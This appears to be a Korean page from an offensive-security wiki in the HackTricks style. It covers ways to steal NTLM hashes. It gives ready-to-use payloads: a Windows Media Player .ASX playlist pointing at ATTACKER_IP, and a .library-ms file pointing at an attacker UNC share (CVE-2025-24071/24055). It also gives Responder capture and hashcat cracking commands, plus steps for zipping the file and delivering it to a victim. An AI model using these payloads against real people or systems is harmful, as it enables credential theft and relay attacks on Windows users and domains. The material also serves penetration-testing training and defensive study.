# NTLM creds를 훔칠 수 있는 장소

{{#include ../../banners/hacktricks-training.md}}

**다음 자료들에서 모든 훌륭한 아이디어를 확인하세요: [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — 온라인에서 microsoft word 파일을 다운로드하는 경우부터 ntlm leaks 소스: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md 및 [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**


### Windows Media Player 재생 목록 (.ASX/.WAX)

대상에게 당신이 제어하는 Windows Media Player playlist를 열거나 미리 보기하게 만들 수 있다면, 항목을 UNC path로 지정해서 Net‑NTLMv2를 leak할 수 있습니다. WMP는 참조된 미디어를 SMB를 통해 가져오려고 시도하며 암묵적으로 인증합니다.

예시 payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
수집 및 cracking 흐름:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP에 포함된 .library-ms NTLM leak (CVE-2025-24071/24055)

Windows 탐색기는 ZIP 아카이브 내부에서 직접 열 때 .library-ms 파일을 안전하지 않게 처리합니다. 라이브러리 정의가 원격 UNC 경로(예: \\attacker\share)를 가리키면, ZIP 내부의 .library-ms를 단순히 찾아보거나 실행하는 것만으로 Explorer가 해당 UNC를 열거하고 공격자에게 NTLM 인증을 전송합니다. 이로 인해 오프라인에서 크랙하거나 잠재적으로 relayed할 수 있는 NetNTLMv2가 생성됩니다.

공격자 UNC를 가리키는 최소한의 .library-ms
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
운영 단계
- 위의 XML로 .library-ms 파일을 생성합니다 (set your IP/hostname).
- Zip it (on Windows: Send to → Compressed (zipped) folder) 후 ZIP을 대상에 전달합니다.
- NTLM capture listener를 실행하고 victim이 ZIP 내부에서 .library-ms를 열 때까지 기다립니다.


## 참고자료
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)


{{#include ../../banners/hacktricks-training.md}}
